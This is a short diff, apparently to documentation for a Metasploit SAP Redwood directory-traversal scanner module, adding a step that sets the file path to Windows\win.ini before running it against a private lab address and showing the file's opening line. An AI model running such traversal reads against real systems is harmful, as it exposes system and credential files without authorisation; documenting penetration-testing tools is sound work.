@@ -20,6 +20,8 @@ msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set rhosts 192.168.2.164
 rhosts => 192.168.2.164
 msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set DEPTH 25
 DEPTH => 25
+msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set FILEPATH Windows\win.ini
+FILEPATH => Windows\win.ini
 msf5 auxiliary(scanner/sap/sap_redwood_traversal) > run
 
 [+] 192.168.2.164:50000 - ; for 16-bit app support
